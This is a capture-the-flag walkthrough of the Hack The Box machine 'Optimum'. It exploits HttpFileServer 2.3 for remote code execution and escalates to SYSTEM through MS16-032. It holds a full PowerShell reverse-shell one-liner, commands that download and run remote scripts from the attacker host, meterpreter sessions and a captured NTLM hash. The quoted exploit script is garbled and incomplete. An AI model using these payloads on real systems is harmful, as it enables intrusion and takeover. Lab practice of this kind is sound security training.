---
title: Hack The Box - Optimum
date: 2022-01-7 12:10:00
categories: [hackthebox]
tags: [windows]
math: true
mermaid: true
toc: true
comments: true
---


## RECON

### NMAP
Starting with `nmap` it shows only port `80(httpd)` open. namp identifies host as `windows`.
- Port 80: `HttpFileServer httpd 2.3`
```bash
#nmap -p- --min-rate 10000 -sC -sV -oN optimum.htb 10.10.10.8 
Nmap scan report for 10.10.10.8 
Host is up (0.13s latency). 
Not shown: 65534 filtered tcp ports (no-response) 
PORT   STATE SERVICE VERSION 
80/tcp open  http    HttpFileServer httpd 2.3 
|_http-server-header: HFS 2.3 
|_http-title: HFS / 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
# Nmap done at Fri Jan  6 20:54:53 2023 -- 1 IP address (1 host up) scanned in 37.71 seconds
```

### WEB PORT - 80

tried some common credentials but did not work on the login portal.

### Searchsploit
A quick look on `searchsploit` shows that it is vulnerable to `remote code execution`  as it is running on `version 2.3`
```
#searchsploit HttpFileServer 
-------------------------------------------------------------------------------------------- --------------------------------- 
 Exploit Title                                                                              |  Path 
-------------------------------------------------------------------------------------------- --------------------------------- 
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                 | windows/webapps/49125.py 
-------------------------------------------------------------------------------------------- --------------------------------- 
Shellcodes: No Results
```
Downloading a copy of this exploit to our machine.
searchsploit -m windows/webapps/49125.py  
This vulnerability is CVE-2014-6287


## SHELL AS KOSTAS

### Method 1 - Using Metasploit
```
[msf](Jobs:0 Agents:0) >> search HttpFileServer 
Matching Modules 
================ 
   #  Name                                   Disclosure Date  Rank       Check  Description 
   -  ----                                   ---------------  ----       -----  ----------- 
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> show options 
Module options (exploit/windows/http/rejetto_hfs_exec): 
   Name       Current Setting  Required  Description 
   ----       ---------------  --------  ----------- 
   HTTPDELAY  10               no        Seconds to wait before terminating web server 
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...] 
   RHOSTS     10.10.10.8       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-M 
                                         etasploit 
   RPORT      80               yes       The target port (TCP) 
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the lo 
                                         cal machine or 0.0.0.0 to listen on all addresses. 
   SRVPORT    8080             yes       The local port to listen on. 
   SSL        false            no        Negotiate SSL/TLS for outgoing connections 
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated) 
   TARGETURI  /                yes       The path of the web application 
   URIPATH                     no        The URI to use for this exploit (default is random) 
   VHOST                       no        HTTP server virtual host 
Payload options (windows/meterpreter/reverse_tcp): 
   Name      Current Setting  Required  Description 
   ----      ---------------  --------  ----------- 
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none) 
   LHOST     tun0             yes       The listen address (an interface may be specified) 
   LPORT     4444             yes       The listen port 
Exploit target: 
   Id  Name 
   --  ---- 
   0   Automatic 
[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> run 
[*] Started reverse TCP handler on 10.10.14.22:4444 
[*] Using URL: http://10.10.14.22:8080/DzNf3Rf 
[*] Server started. 
[*] Sending a malicious request to / 
[*] Payload request received: /DzNf3Rf 
[*] Sending stage (175686 bytes) to 10.10.10.8 
[!] Tried to delete %TEMP%\YbejMLLqxmRl.vbs, unknown result 
[*] Meterpreter session 1 opened (10.10.14.22:4444 -> 10.10.10.8:49379) at 2023-01-07 10:05:34 +0545 
[*] Server stopped. 
(Meterpreter 1)(C:\Users\kostas\Desktop) >
```


## SHELL AS SYSTEM

```
(Meterpreter 1)(C:\Users\kostas\Desktop) > sysinfo 
Computer        : OPTIMUM 
OS              : Windows 2012 R2 (6.3 Build 9600). 
Architecture    : x64 
System Language : el_GR 
Domain          : HTB 
Logged On Users : 6 
Meterpreter     : x86/windows 
```
Here, since meterpreter is running on `x86 process` we want to migrate it to `x64 process`. 
```
(Meterpreter 1)(C:\Users\kostas\Desktop) > ps 
292   1756  explorer.exe          x64   1        OPTIMUM\kostas  C:\Windows\explorer.exe 
..[SNIP]..
```
on checking current running process we found that `explorer.exe` is running on x64 process with `PID 292`. we will `migrate` our meterpreter session to it.
```
(Meterpreter 1)(C:\Users\kostas\Desktop) > migrate 292 
[*] Migrating from 1036 to 292... 
[*] Migration completed successfully. 
(Meterpreter 1)(C:\Windows\system32) > sysinfo 
Computer        : OPTIMUM 
OS              : Windows 2012 R2 (6.3 Build 9600). 
Architecture    : x64 
System Language : el_GR 
Domain          : HTB 
Logged On Users : 6 
Meterpreter     : x64/windows
```
now our meterpreter session is running with `x64 process`.
We will now run our meterpreter session on background and use post local_exploit_suggester module to look for any `privesec` possibilities.
```
(Meterpreter 1)(C:\Windows\system32) > background 
[*] Backgrounding session 1... 
[msf](Jobs:0 Agents:1) exploit(windows/http/rejetto_hfs_exec) >> search suggester 
Matching Modules 
================ 
   #  Name                                      Disclosure Date  Rank    Check  Description 
   -  ----                                      ---------------  ----    -----  ----------- 
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester 
Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester 
[msf](Jobs:0 Agents:1) exploit(windows/http/rejetto_hfs_exec) >> use 0 
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> show options 
Module options (post/multi/recon/local_exploit_suggester): 
   Name             Current Setting  Required  Description 
   ----             ---------------  --------  ----------- 
   SESSION                           yes       The session to run this module on 
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits 
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> set session 1 
session => 1 
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> run 
[*] 10.10.10.8 - Collecting local exploits for x64/windows... 
[*] 10.10.10.8 - 172 exploit checks are being tried... 
[+] 10.10.10.8 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable. 
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. 
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable. 
[+] 10.10.10.8 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable. 
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. 
[*] Running check method for exploit 41 / 41 
[*] 10.10.10.8 - Valid modules for session 1: 
============================ 
 #   Name                                                           Potentially Vulnerable?  Check Result 
 -   ----                                                           -----------------------  ------------ 
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable. 
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable. 
 3   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable. 
 4   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable. 
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
```

MS16_032
```
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> use exploit/windows/local/ms16_032_secondary_logon_handle_privesc 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp 
[msf](Jobs:0 Agents:1) exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >> set payload windows/x64/meterpreter/reverse 
[-] The value specified for payload is not valid. 
[msf](Jobs:0 Agents:1) exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >> set payload windows/x64/meterpreter/reverse_tcp 
payload => windows/x64/meterpreter/reverse_tcp

[msf](Jobs:0 Agents:1) exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >> run 
[*] Started reverse TCP handler on 10.10.14.22:4444 
[+] Compressed size: 1160 
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\uehAetoGQB.ps1... 
[*] Compressing script contents... 
[+] Compressed size: 3735 
[*] Executing exploit script...

[!] Holy handle leak Batman, we have a SYSTEM shell!! 
dxZv6LHmk9WPLnhKx9vN9Rlw4vz4vc3H 
[+] Executed on target machine. 
[*] Sending stage (200774 bytes) to 10.10.10.8 
[*] Meterpreter session 2 opened (10.10.14.22:4444 -> 10.10.10.8:49380) at 2023-01-07 10:17:29 +0545 
[+] Deleted C:\Users\kostas\AppData\Local\Temp\uehAetoGQB.ps1
(Meterpreter 2)(C:\Windows\system32) > shell 
Process 1252 created. 
Channel 1 created. 
Microsoft Windows [Version 6.3.9600] 
(c) 2013 Microsoft Corporation. All rights reserved. 
C:\Windows\system32>whoami 
whoami 
nt authority\system
```
Since we are running our meterpreter session on x64 process, we need to set payload to `windows/x64/meterpreter/reverse_tcp` else it might not work as expected.
once the exploit completes we are prompt with the system shell.


## SHELL AS KOSTAS

### Method 2 - without metasploit
### Exploit Analysis
Going back to the exploit we found earlier using searchsploit.

```python
#!/usr/bin/python3 
# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command> 
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')" 
import urllib3 
import sys V
import urllib.parse 
try: 
        http = urllib3.PoolManager() 
        url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=' 
        print(url) 
        response = http.request('GET', url) 
except Exception as ex: 
        print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command") 
        print(ex)
```

The above exploit is just making an http request to  `/?search={.+exec|[url-encoded command].}` get RCE. 

Powershell reverse shell from nishang. Just updated the IP and port to our netcat listener and saved it as shell.ps1 and hosting it is using our python httpserver.
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.22',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Executing the script.
```
#python3 49125.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.22/shell.ps1')" 
```
This exploit triggers Optimum to reach out and download shell.ps1,
```
$sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.8 - - [07/Jan/2023 10:53:57] "GET /shell.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [07/Jan/2023 10:53:58] "GET /shell.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [07/Jan/2023 10:53:58] "GET /shell.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [07/Jan/2023 10:54:05] "GET /shell.ps1 HTTP/1.1" 200 -
```
 It is then executed and the shell connects back to our nc listener.
```
$sudo rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.10.8] 49162

whoami
optimum\kostas
```

### SHELL AS SYSTEM
Using Sherlock[https://github.com/rasta-mouse/Sherlock]: 
PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.

we will now host `sherlock.ps1` using `smbserver` .
```
sudo python3 smbserver.py share .
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.8,49166)
[*] AUTHENTICATE_MESSAGE (OPTIMUM\kostas,OPTIMUM)
[*] User OPTIMUM\kostas authenticated successfully
[*] kostas::OPTIMUM:aaaaaaaaaaaaaaaa:696d9351ce30b3772e4542da1386af2c:010100000000000000f984765922d9015bbccf6de560cced0000000001001000720076007900410046004400550077000300100072007600790041004600440055007700020010004e005a005600700072004c0078004b00040010004e005a005600700072004c0078004b000700080000f984765922d901060004000200000008003000300000000000000000000000002000003c1da671d7ef6384def65832ee4d8f3ac112285b31d1344ba4ff1cd363cfaf450a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003200000000000000000000000000
```
Downloading sherlock on the `optimum machine`.
```
PS C:\Users\kostas\Desktop> copy \\10.10.14.22\share\sherlock.ps1
```

Executing sherlock
```
./sherlock.ps1

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable
```

it shows three vulnerabilities MS16-032, MS16-034, and MS16-135.

### MS16-032
Using `empire` privesc exploit 
we’ll download a copy of that, and add a line at the end to call it with a command to download and execute our reverse shell:
```
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.22/rev.ps1')"
```
Hosting our Invoke-MS16032.ps1 and rev.ps1
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

10.10.10.8 - - [07/Jan/2023 11:42:41] "GET /Invoke-MS16032.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [07/Jan/2023 11:43:00] "GET /rev.ps1 HTTP/1.1" 200 -
```

```
PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.22/Invoke-MS16032.ps1') 
     __ __ ___ ___   ___     ___ ___ ___
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|

                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!
```
and we got the shell as `system`.
```
$sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.10.8] 49176

PS C:\Users\kostas\Desktop> whoami
nt authority\system
PS C:\Users\kostas\Desktop>
```
